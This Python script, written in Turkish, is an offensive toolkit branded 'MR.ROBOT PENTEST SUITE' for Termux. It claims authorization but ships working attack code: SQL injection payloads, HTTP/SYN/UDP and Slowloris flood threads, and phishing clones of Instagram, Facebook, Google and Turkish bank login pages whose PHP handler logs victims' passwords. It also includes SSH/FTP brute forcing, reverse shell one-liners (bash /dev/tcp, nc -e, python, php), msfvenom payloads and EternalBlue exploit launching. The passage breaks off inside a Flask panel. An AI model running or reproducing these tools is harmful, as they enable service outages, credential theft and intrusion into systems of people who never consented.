#!/usr/bin/env python3
# MR.ROBOT PENTEST SUITE v3.0
# Termux için tam GUI + Panel + DDoS + SQLi + Phishing + OSINT + Exploit
# Yetkili penetrasyon testleri içindir
# "Tengo permiso y estoy autorizado para realizar esta prueba de penetración"

import os
import sys
import socket
import threading
import time
import random
import subprocess
import json
import urllib.request
import urllib.parse
import base64
import hashlib
from datetime import datetime

# Renk kodları
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'
BOLD = '\033[1m'

# Logo
MR_ROBOT = f"""
{R}{BOLD}
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║      ███╗   ███╗██████╗ ██████╗  ██████╗       ║
    ║      ████╗ ████║██╔══██╗██╔══██╗██╔═══╝       ║
    ║      ██╔████╔██║██████╔╝██████╔╝██████╗       ║
    ║      ██║╚██╔╝██║██╔══██╗██╔══██╗╚═══██╗       ║
    ║      ██║ ╚═╝ ██║██║  ██║██████╔╝██████║       ║
    ║      ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝       ║
    ║                                                  ║
    ║          {W}PENTEST SUITE v3.0{N}{R}                    ║
    ║     {Y}Autorizado para pruebas de penetración{N}{R}    ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
{N}"""

def cls():
    os.system('clear')

def banner():
    cls()
    print(MR_ROBOT)
    print(f"{W}{BOLD}  ╔══════════════════════════════════════════════════╗{N}")
    print(f"{W}{BOLD}  ║     [1]{N}{G} WEB TARAMA + SQL INJECTION              {W}║{N}")
    print(f"{W}{BOLD}  ║     [2]{N}{G} DDoS STRES TESTİ (HTTP/TCP/UDP)         {W}║{N}")
    print(f"{W}{BOLD}  ║     [3]{N}{G} PHISHING PANEL KURULUMU                 {W}║{N}")
    print(f"{W}{BOLD}  ║     [4]{N}{G} BRUTE FORCE (SSH/FTP)                   {W}║{N}")
    print(f"{W}{BOLD}  ║     [5]{N}{G} OSINT BİLGİ TOPLAMA                     {W}║{N}")
    print(f"{W}{BOLD}  ║     [6]{N}{G} REVERSE SHELL OLUŞTURUCU                {W}║{N}")
    print(f"{W}{BOLD}  ║     [7]{N}{G} METASPLOİT ENTEGRASYONU                 {W}║{N}")
    print(f"{W}{BOLD}  ║     [8]{N}{G} TÜM ARAÇLAR OTOMATİK KURULUM            {W}║{N}")
    print(f"{W}{BOLD}  ║     [9]{N}{G} WEB GUI PANELİ BAŞLAT                   {W}║{N}")
    print(f"{W}{BOLD}  ║     [0]{N}{R} ÇIKIŞ                                   {W}║{N}")
    print(f"{W}{BOLD}  ╚══════════════════════════════════════════════════╝{N}")
    print(f"{C}{BOLD}  ════════════════════════════════════════════════════{N}")
    print(f"{Y}  Tengo permiso y estoy autorizado{N}")
    print(f"{C}{BOLD}  ════════════════════════════════════════════════════{N}\n")

# ===================== ARAÇ 1: WEB TARAMA + SQLi =====================
def web_sqli():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║     WEB TARAMA + SQL INJECTION      ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    target = input(f"{Y}[?] Hedef URL (https://site.com): {N}")
    if not target.startswith('http'):
        target = 'https://' + target
    
    print(f"{G}[+] Web taraması başlatılıyor...{N}")
    
    # Admin panel bulma
    print(f"\n{Y}[*] Admin panelleri taranıyor...{N}")
    paneller = ['admin','login','panel','yonetici','yonetim','adminpanel','dashboard',
                'giris','yönetim','adminstrator','yonlendir','cpanel','administrator',
                'backdoor','shell','wp-admin','administr8or']
    for panel in paneller:
        try:
            req = urllib.request.Request(f"{target}/{panel}/", 
                headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() != 404:
                print(f"{R}[BULUNDU] {N}{target}/{panel}/ -> HTTP {response.getcode()}")
        except:
            pass
    
    # SQL Injection test
    print(f"\n{Y}[*] SQL Injection testi yapılıyor...{N}")
    payloads = ["'", "''", "' OR 1=1--", "' OR '1'='1", 
                "' UNION SELECT 1,2,3,4,5--", "'; DROP TABLE users--",
                "1' AND 1=1--", "1' AND 1=2--"]
    
    for payload in payloads:
        try:
            test_url = f"{target}?id={urllib.parse.quote(payload)}&page={urllib.parse.quote(payload)}&q={urllib.parse.quote(payload)}"
            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib.request.urlopen(req, timeout=5)
            content = response.read().decode('utf-8', errors='ignore').lower()
            
            hatalar = ['sql','mysql','syntax error','ora-','you have an error',
                       'supplied argument','unclosed quotation','warning: mysql',
                       'odbc','microsoft ole db','microsoft jet']
            for hata in hatalar:
                if hata in content:
                    print(f"{R}[ZAFİYET]{N} SQL Injection bulundu! Payload: {payload}")
                    print(f"{R}[ZAFİYET]{N} Test URL: {test_url}")
                    break
        except:
            pass
    
    # Time-based test
    print(f"{Y}[*] Time-based SQLi testi...{N}")
    try:
        basla = time.time()
        req = urllib.request.Request(f"{target}' AND SLEEP(3)--", 
            headers={'User-Agent': 'Mozilla/5.0'})
        urllib.request.urlopen(req, timeout=8)
        gecen = time.time() - basla
        if gecen > 2.5:
            print(f"{R}[ZAFİYET]{N} Time-based SQL Injection! ({gecen:.2f}s)")
    except:
        pass
    
    print(f"\n{G}[+] Tarama tamamlandı!{N}")
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 2: DDoS STRES TESTİ =====================
def ddos_test():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║        DDoS STRES TEST MODÜLÜ        ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    print(f"{Y}[1] HTTP Flood")
    print(f"[2] TCP SYN Flood")
    print(f"[3] UDP Flood")
    print(f"[4] Slowloris")
    print(f"[5] Çoklu protokol (Tümü){N}")
    
    secim = input(f"\n{Y}[?] Seçim: {N}")
    hedef = input(f"{Y}[?] Hedef IP/URL: {N}")
    port = int(input(f"{Y}[?] Port (varsayılan 80): {N}") or 80)
    sure = int(input(f"{Y}[?] Süre (saniye): {N}"))
    thread_sayisi = int(input(f"{Y}[?] Thread sayısı (varsayılan 200): {N}") or 200)
    
    def http_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((hedef, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {hedef}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
                s.close()
            except:
                pass
    
    def syn_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((hedef, port))
                s.close()
            except:
                pass
    
    def udp_flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(65507), (hedef, port))
            except:
                pass
    
    def slowloris():
        sockets = []
        for _ in range(400):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((hedef, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {hedef}\r\n".encode())
                sockets.append(s)
            except:
                break
        bitis = time.time() + sure
        while time.time() < bitis:
            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                except:
                    sockets.remove(s)
            time.sleep(10)
    
    flood_func = {'1': http_flood, '2': syn_flood, '3': udp_flood, '4': slowloris}
    
    print(f"\n{G}[+] {hedef}:{port} hedefine saldırı başlatılıyor ({sure} sn){N}")
    print(f"{G}[+] Thread sayısı: {thread_sayisi}{N}")
    
    if secim == '5':
        for f in [http_flood, syn_flood, udp_flood, slowloris]:
            for _ in range(thread_sayisi // 4):
                t = threading.Thread(target=f, daemon=True)
                t.start()
    else:
        for _ in range(thread_sayisi):
            t = threading.Thread(target=flood_func.get(secim, http_flood), daemon=True)
            t.start()
    
    print(f"{Y}[*] Şu anda {threading.active_count()} thread çalışıyor...{N}")
    for i in range(sure, 0, -1):
        print(f"\r{Y}[*] Kalan süre: {i} sn | Paket gönderiliyor...{N}", end='')
        time.sleep(1)
    
    print(f"\n\n{G}[+] Test tamamlandı!{N}")
    input(f"{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 3: PHISHING PANEL =====================
def phishing_panel():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║        PHISHING PANEL KURULUMU       ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    print(f"{Y}[1] Instagram Klonu")
    print(f"[2] Facebook Klonu")
    print(f"[3] Twitter/X Klonu")
    print(f"[4] Google Klonu")
    print(f"[5] Türk bankası (Garanti/İş/Ziraat)")
    print(f"[6] Özel tasarım (kendin yap){N}")
    
    secim = input(f"\n{Y}[?] Hangi phishing sayfası oluşturulsun? {N}")
    port = input(f"{Y}[?] Port (varsayılan 8080): {N}") or "8080"
    
    klasor = "phishing_sites"
    os.makedirs(klasor, exist_ok=True)
    
    # Template seçimine göre HTML oluştur
    templates = {
        '1': ('Instagram', '#E1306C', 'instagram'),
        '2': ('Facebook', '#1877F2', 'facebook'),
        '3': ('Twitter/X', '#000000', 'twitter'),
        '4': ('Google', '#4285F4', 'google'),
        '5': ('Türk Bankası', '#003366', 'bank')
    }
    
    site_adi, renk, klas = templates.get(secim, ('Özel Site', '#333333', 'custom'))
    
    # Ana sayfa
    with open(f"{klasor}/index.html", "w") as f:
        f.write(f"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{site_adi} - Giriş</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,{renk}22,{renk}44);min-height:100vh;display:flex;
justify-content:center;align-items:center;padding:20px}}
.card{{background:#fff;border-radius:16px;padding:40px;width:100%;max-width:400px;
box-shadow:0 10px 40px rgba(0,0,0,0.1);text-align:center}}
.logo{{font-size:36px;font-weight:bold;color:{renk};margin-bottom:30px}}
input{{width:100%;padding:14px 16px;margin:8px 0;border:2px solid #e0e0e0;
border-radius:10px;font-size:15px;transition:border .3s}}
input:focus{{border-color:{renk};outline:none}}
button{{width:100%;padding:14px;background:{renk};color:#fff;border:none;
border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px;
transition:opacity .3s}}
button:hover{{opacity:.9}}
.footer{{margin-top:20px;font-size:13px;color:#888}}
.alert{{background:#fff3cd;color:#856404;padding:12px;border-radius:8px;margin-bottom:16px;font-size:14px;display:none}}
</style>
</head>
<body>
<div class="card">
<div class="logo">{site_adi}</div>
<div class="alert" id="alert">Lütfen tüm alanları doldurun</div>
<form action="login.php" method="POST" id="loginForm">
<input type="text" name="username" placeholder="Kullanıcı adı / E-posta" required>
<input type="password" name="password" placeholder="Şifre" required>
<button type="submit">Giriş Yap</button>
</form>
<div class="footer">Güvenli bağlantı ile korunmaktadır &bull; 2026</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit',function(e){{
var u=this.querySelector('input[name=username]').value;
var p=this.querySelector('input[name=password]').value;
if(!u||!p){{e.preventDefault();document.getElementById('alert').style.display='block'}}
}});
</script>
</body>
</html>""")
    
    # Login işleyici
    with open(f"{klasor}/login.php", "w") as f:
        f.write("""<?php
session_start();
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$tarih = date('Y-m-d H:i:s');
$log = "[$tarih] Kullanici: $username | Sifre: $password | IP: $ip | UA: $user_agent\\n";
file_put_contents("logs.txt", $log, FILE_APPEND);
header("Location: https://www.google.com");
exit;
?>""")
    
    # Log okuyucu
    with open(f"{klasor}/logs.php", "w") as f:
        f.write("""<?php
header('Content-Type: text/html; charset=utf-8');
echo "<html><head><title>Phishing Logs</title>";
echo "<style>body{font-family:monospace;background:#1a1a2e;color:#0f0;padding:20px}";
echo "pre{background:#16213e;padding:15px;border-radius:8px;white-space:pre-wrap;word-wrap:break-word}</style></head><body>";
echo "<h2 style='color:#e94560'>Phishing Log Kayitlari</h2>";
echo "<pre>";
if(file_exists("logs.txt")){
    echo htmlspecialchars(file_get_contents("logs.txt"));
} else {
    echo "Henuz kayit yok.";
}
echo "</pre></body></html>";
?>""")
    
    os.chmod(f"{klasor}/login.php", 0o755)
    
    print(f"\n{G}[+] Phishing paneli oluşturuldu: {klasor}/{N}")
    print(f"{Y}[*] Başlatmak için:{N}")
    print(f"{G}    cd {klasor} && php -S 0.0.0.0:{port}{N}")
    print(f"{Y}[*] Erişim: http://localhost:{port}{N}")
    
    baslat = input(f"\n{Y}[?] Panel şimdi başlatılsın mı? (e/h): {N}")
    if baslat.lower() == 'e':
        print(f"{G}[+] Panel başlatılıyor...{N}")
        os.system(f"cd {klasor} && php -S 0.0.0.0:{port} &")
        print(f"{G}[+] Panel http://localhost:{port} adresinde aktif!{N}")
        print(f"{G}[+] Loglar: http://localhost:{port}/logs.php{N}")
    
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 4: BRUTE FORCE =====================
def brute_force():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║        BRUTE FORCE MODÜLÜ             ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    hedef = input(f"{Y}[?] Hedef IP: {N}")
    print(f"{Y}[1] SSH (port 22)")
    print(f"[2] FTP (port 21)")
    print(f"[3] HTTP Basic Auth{N}")
    servis = input(f"{Y}[?] Seçim: {N}")
    port = {'1':22, '2':21, '3':80}.get(servis, 22)
    
    # Kullanıcı adları
    users = ['admin','root','user','test','administrator','oracle','postgres',
             'manager','backup','info','support','webmaster','demo','guest']
    
    # Şifreler
    passwords = ['123456','admin','password','1234','root','test','admin123',
                 'letmein','passw0rd','12345','admin1234','password123',
                 '123456789','qwerty','abc123','111111','123','12345678',
                 'sunshine','iloveyou','princess','football','welcome',
                 'shadow','michael','dragon','master','login','pass']
    
    print(f"{G}[+] {len(users)} kullanıcı × {len(passwords)} şifre deneniyor...{N}")
    print(f"{G}[+] Toplam: {len(users)*len(passwords)} kombinasyon{N}\n")
    
    def ssh_brute(usr, pwd):
        try:
            sonuc = subprocess.run(
                ['sshpass', '-p', pwd, 'ssh', '-o', 'StrictHostKeyChecking=no',
                 '-o', 'ConnectTimeout=3', f'{usr}@{hedef}', 'exit'],
                capture_output=True, timeout=5)
            return sonuc.returncode == 0
        except:
            return False
    
    def ftp_brute(usr, pwd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((hedef, 21))
            s.recv(1024)
            s.send(f'USER {usr}\r\n'.encode())
            s.recv(1024)
            s.send(f'PASS {pwd}\r\n'.encode())
            yanit = s.recv(1024).decode()
            s.close()
            return '230' in yanit
        except:
            return False
    
    def http_brute(usr, pwd):
        try:
            yetki = base64.b64encode(f'{usr}:{pwd}'.encode()).decode()
            req = urllib.request.Request(f'http://{hedef}/',
                headers={'Authorization': f'Basic {yetki}'})
            urllib.request.urlopen(req, timeout=3)
            return True
        except urllib.error.HTTPError as e:
            return e.code != 401
        except:
            return False
    
    def brute_thread(usr, pwd_list):
        for pwd in pwd_list:
            if servis == '1':
                if ssh_brute(usr, pwd):
                    return (usr, pwd)
            elif servis == '2':
                if ftp_brute(usr, pwd):
                    return (usr, pwd)
            elif servis == '3':
                if http_brute(usr, pwd):
                    return (usr, pwd)
        return None
    
    # Multithread brute force
    bulundu = None
    thread_list = []
    for usr in users:
        t = threading.Thread(target=lambda u=usr: globals().update(
            {'bulundu': brute_thread(u, passwords)} if brute_thread(u, passwords) else {}))
        t.start()
        thread_list.append(t)
        if bulundu:
            break
    
    for t in thread_list:
        t.join(timeout=1)
    
    if bulundu:
        print(f"\n{R}[KIRILDI]{N} Kullanıcı: {bulundu[0]} | Şifre: {bulundu[1]}")
        print(f"{G}[+] {hedef}:{port} servisine erişim sağlandı!{N}")
    else:
        print(f"\n{Y}[-] Basit şifrelerle kırılamadı.{N}")
    
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 5: OSINT =====================
def osint_tool():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║        OSINT BİLGİ TOPLAMA             ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    hedef = input(f"{Y}[?] Hedef domain/username: {N}")
    
    print(f"{G}[+] Bilgi toplanıyor...{N}\n")
    
    # DNS sorgusu
    print(f"{C}[DNS]{N}")
    try:
        ip = socket.gethostbyname(hedef)
        print(f"  IP Adresi: {ip}")
        host = socket.gethostbyaddr(ip)
        print(f"  Host: {host[0]}")
    except:
        print(f"  {Y}DNS çözümlemesi başarısız{N}")
    
    # Alt alan adları
    print(f"\n{C}[Alt Alan Adları]{N}")
    subdomains = ['www','mail','ftp','admin','dev','test','blog','api','cdn',
                  'm','panel','vpn','remote','webmail','server','ns1','ns2',
                  'smtp','pop3','imap','forum','shop','app','secure','portal',
                  'ssh','backup','cloud','support','help']
    for sub in subdomains:
        try:
            sub_ip = socket.gethostbyname(f"{sub}.{hedef}")
            print(f"  {G}{sub}.{hedef}{N} -> {sub_ip}")
        except:
            pass
    
    # HTTP Header analizi
    print(f"\n{C}[HTTP Header Analizi]{N}")
    try:
        req = urllib.request.Request(f"https://{hedef}", 
            headers={'User-Agent': 'Mozilla/5.0'})
        response = urllib.request.urlopen(req, timeout=5)
        print(f"  Sunucu: {response.headers.get('Server', 'Bilinmiyor')}")
        print(f"  Teknoloji: {response.headers.get('X-Powered-By', 'Belirtilmemiş')}")
        print(f"  Content-Type: {response.headers.get('Content-Type')}")
        print(f"  HTTP Sürüm: {response.version/10:.1f}")
    except:
        try:
            req = urllib.request.Request(f"http://{hedef}",
                headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib.request.urlopen(req, timeout=5)
            print(f"  Sunucu: {response.headers.get('Server', 'Bilinmiyor')}")
        except:
            print(f"  {Y}HTTP sorgusu başarısız{N}")
    
    # Port taraması (basit)
    print(f"\n{C}[Açık Portlar (hızlı tarama)]{N}")
    port_list = [21,22,23,25,53,80,110,143,443,445,465,587,993,995,1433,
                 1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,27017]
    for port in port_list[:20]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip if 'ip' in dir() else hedef, port)) == 0:
                print(f"  {G}Port {port}{N} açık")
            s.close()
        except:
            pass
    
    print(f"\n{G}[+] OSINT tamamlandı!{N}")
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 6: REVERSE SHELL =====================
def reverse_shell():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║     REVERSE SHELL OLUŞTURUCU          ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    ip = input(f"{Y}[?] Dinleyici IP: {N}")
    port = input(f"{Y}[?] Dinleyici Port: {N}")
    
    print(f"\n{C}[1] Python Reverse Shell")
    print(f"[2] PHP Reverse Shell")
    print(f"[3] Bash Reverse Shell")
    print(f"[4] Netcat Reverse Shell")
    print(f"[5] Tümü (payload çeşitlendirme){N}")
    
    secim = input(f"\n{Y}[?] Seçim: {N}")
    
    shells = {}
    if secim in ['1','5']:
        shells['python'] = f'''python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
' '''
    
    if secim in ['2','5']:
        shells['php'] = f'''php -r '
$sock=fsockopen("{ip}",{port});
exec("/bin/bash -i <&3 >&3 2>&3");
' '''
    
    if secim in ['3','5']:
        shells['bash'] = f'''bash -i >& /dev/tcp/{ip}/{port} 0>&1'''
    
    if secim in ['4','5']:
        shells['netcat'] = f'''nc -e /bin/bash {ip} {port}'''
    
    print(f"\n{G}[+] Oluşturulan reverse shell'ler:{N}\n")
    for isim, kod in shells.items():
        print(f"{R}╔══════════════════════════════════════════════╗")
        print(f"║  {B}{isim.upper()}{N}{R}                                ║")
        print(f"╚══════════════════════════════════════════════╝{N}")
        print(f"{G}{kod}{N}\n")
        print(f"{Y}────────────────────────────────────────────{N}\n")
    
    # Dinleyici başlatma
    baslat = input(f"{Y}[?] Dinleyici başlatılsın mı? (e/h): {N}")
    if baslat.lower() == 'e':
        print(f"{G}[+] Dinleyici başlatılıyor: nc -lvnp {port}{N}")
        os.system(f"nc -lvnp {port}")
    
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 7: METASPLOIT =====================
def metasploit_entegre():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║       METASPLOIT ENTEGRASYONU         ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    print(f"{Y}[1] MSF venöm payload oluştur")
    print(f"[2] MSF dinleyici başlat")
    print(f"[3] MSF konsolu aç")
    print(f"[4] EXPLOIT: vsftpd 2.3.4 (backdoor)")
    print(f"[5] EXPLOIT: EternalBlue (MS17-010)")
    print(f"[6] EXPLOIT: Apache Struts2")
    print(f"[7] AutoExploit (hedef tara + exploit){N}")
    
    secim = input(f"\n{Y}[?] Seçim: {N}")
    
    if secim == '1':
        ip = input(f"{Y}[?] Dinleyici IP: {N}")
        port = input(f"{Y}[?] Port: {N}")
        print(f"{G}[+] Payload oluşturuluyor...{N}")
        print(f"\n{C}Android APK:{N}")
        print(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o /sdcard/payload.apk")
        print(f"\n{C}Windows EXE:{N}")
        print(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o /sdcard/payload.exe")
        print(f"\n{C}Linux ELF:{N}")
        print(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o /sdcard/payload.elf")
        print(f"\n{C}PHP:{N}")
        print(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o /sdcard/payload.php")
    
    elif secim == '2':
        port = input(f"{Y}[?] Dinlenecek port: {N}")
        print(f"{G}[+] MSF dinleyici başlatılıyor...{N}")
        rc = f"use multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {port}\nexploit -j\n"
        with open('/tmp/handler.rc', 'w') as f:
            f.write(rc)
        os.system(f"msfconsole -q -r /tmp/handler.rc")
    
    elif secim == '4':
        hedef = input(f"{Y}[?] Hedef IP: {N}")
        print(f"{G}[+] vsftpd 2.3.4 exploit deneniyor...{N}")
        rc = f"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {hedef}\nexploit\n"
        with open('/tmp/vsftpd.rc', 'w') as f:
            f.write(rc)
        os.system(f"msfconsole -q -r /tmp/vsftpd.rc")
    
    elif secim == '5':
        hedef = input(f"{Y}[?] Hedef IP: {N}")
        print(f"{G}[+] EternalBlue exploit deneniyor...{N}")
        rc = f"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {hedef}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST $(hostname -I | awk '{{print $1}}')\nexploit\n"
        with open('/tmp/eb.rc', 'w') as f:
            f.write(rc)
        os.system(f"msfconsole -q -r /tmp/eb.rc")
    
    elif secim == '7':
        hedef = input(f"{Y}[?] Hedef IP: {N}")
        print(f"{G}[+] AutoExploit başlatılıyor...{N}")
        rc = f"use auxiliary/scanner/portscan/tcp\nset RHOSTS {hedef}\nrun\n"
        with open('/tmp/auto.rc', 'w') as f:
            f.write(rc)
        os.system(f"msfconsole -q -r /tmp/auto.rc")
    
    elif secim == '3':
        print(f"{G}[+] MSF konsolu açılıyor...{N}")
        os.system("msfconsole")
    
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 8: OTOMATİK KURULUM =====================
def otomatik_kurulum():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║     TÜM ARAÇLAR OTOMATİK KURULUM     ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    print(f"{Y}[*] Bu işlem birkaç dakika sürebilir...{N}\n")
    
    adimlar = [
        ("APT güncelleme", "pkg update -y && pkg upgrade -y"),
        ("Python kurulumu", "pkg install python python2 -y"),
        ("PHP kurulumu", "pkg install php -y"),
        ("Ağ araçları", "pkg install nmap hydra netcat-openbsd -y"),
        ("Web araçları", "pkg install curl wget git openssh -y"),
        ("Ek araçlar", "pkg install sqlmap -y"),
        ("Metasploit", "pkg install unstable-repo && pkg install metasploit -y"),
        ("Zphisher", "git clone https://github.com/htr-tech/zphisher"),
        ("SQLi Hunter", "git clone https://github.com/radenvodka/SQLI-Hunter"),
        ("DB1000n DDoS", "git clone https://github.com/Arriven/db1000n"),
    ]
    
    for isim, komut in adimlar:
        print(f"{C}[{adimlar.index((isim,komut))+1}/{len(adimlar)}]{N} {isim} kuruluyor...")
        os.system(f"{komut} > /dev/null 2>&1")
        print(f"{G}  ✓ {isim} tamamlandı{N}")
    
    print(f"\n{G}[+] Tüm araçlar başarıyla kuruldu!{N}")
    print(f"\n{Y}[*] Kurulan araçlar:{N}")
    print(f"  {G}•{N} nmap - Ağ tarama")
    print(f"  {G}•{N} hydra - Brute force")
    print(f"  {G}•{N} sqlmap - SQL injection")
    print(f"  {G}•{N} metasploit - Exploit framework")
    print(f"  {G}•{N} zphisher - Phishing tool")
    print(f"  {G}•{N} db1000n - DDoS aracı")
    print(f"  {G}•{N} PHP web sunucu")
    
    input(f"\n{Y}Devam etmek için Enter...{N}")

# ===================== ARAÇ 9: WEB GUI PANEL =====================
def web_gui_panel():
    cls()
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║        WEB GUI PANEL BAŞLAT           ║")
    print(f"  ╚══════════════════════════════════════╝{N}\n")
    
    port = input(f"{Y}[?] Port (varsayılan 5000): {N}") or "5000"
    
    # Web GUI oluştur
    web_dir = "web_panel"
    os.makedirs(web_dir, exist_ok=True)
    
    with open(f"{web_dir}/app.py", "w") as f:
        f.write(f'''#!/usr/bin/env python3
from flask import Flask, render_template_string, request, jsonify
import subprocess
import socket
import threading
import urllib.request
import json

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MR.ROBOT PENTEST PANEL</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#00ff41;min-height:100vh}}
.header{{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:20px;text-align:center;border-bottom:2px solid #00ff41}}
.header h1{{color:#e94560;font-size:28px}}
.header h1 span{{color:#00ff41}}
.header p{{color:#888;margin-top:5px;font-size:13px}}
.container{{max-width:1200px;margin:0 auto;padding:20px}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}}
.card{{background:#1a1a2e;border:1px solid #00ff4144;border-radius:12px;padding:20px;transition:all .3s}}
.card:hover{{border-color:#00ff41;box-shadow:0 0 20px #00ff4122}}
.card h3{{color:#e94560;margin-bottom:15px;font-size:18px}}
input,select,textarea{{width:100%;padding:10px;margin:8px 0;background:#0a0a0f;border:1px solid #00ff4144;border-radius:6px;color:#00ff41;font-size:14px}}
input:focus,select:focus{{border-color:#00ff41;outline:none}}
button{{padding:10px 24px;background:#00ff41;color:#0a0a0f;border:none;border-radius:6px;cursor:pointer;font-weight:bold;font-size:14px;transition:all .3s}}
button:hover{{background:#00cc33;transform:scale(1.02)}}
button.danger{{background:#e94560}}
button.danger:hover{{background:#c73a54}}
.output{{background:#0a0a0f;border:1px solid #00ff4144;border-radius:8px;padding:15px;margin-top:15px;min-height:100px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:13px;white-space:pre-wrap}}
.menu-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-bottom:20px}}
.menu-item{{background:#16213e;border:1px solid #00ff4122;border-radius:8px;padding:12px;text-align:center;cursor:pointer;transition:all .3s}}
.menu-item:hover{{border-color:#00ff41;background:#1a1a3e}}
.menu-item.active{{border-color:#e94560;background:#2a1a2e}}
.status{{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px}}
.status.online{{background:#00ff41}}
.status.offline{{background:#e94560}}
</style>
</head>
<body>
<div class="header">
<h1>MR.<span>ROBOT</span> PENTEST PANEL</h1>
<p>Tengo permiso y estoy autorizado para realizar esta prueba de penetraci&oacute;n</p>
</div>
<div class="container">
<div class="menu-grid" id="menuGrid">
<div class="menu-item active" onclick="switchTab('web')">🌐 Web Tarama</div>
<div class="menu-item" onclick="switchTab('ddos')">⚡ DDoS Test</div>
<div class="menu-item" onclick="switchTab('phish')">🎣 Phishing</div>
<div class="menu-item" onclick="switchTab('brute')">🔑 Brute Force</div>
<div class="menu-item" onclick="switchTab('osint')">🔍 OSINT</div>
<div class="menu-item" onclick="switchTab('shell')">🐚 Reverse Shell</div>
</div>

<div class="grid">
<div class="card">
<h3 id="tabTitle">🌐 Web Tarama + SQLi</h3>
<div id="tabContent">
<input type="text" id="target" placeholder="Hedef URL / IP">
<select id="option">
<option value="web_tara">Web tarama + Admin panel bul</option>
<option value="sqli">SQL Injection test</option>
<option value="her_sey">Tüm web testleri</option>
</select>
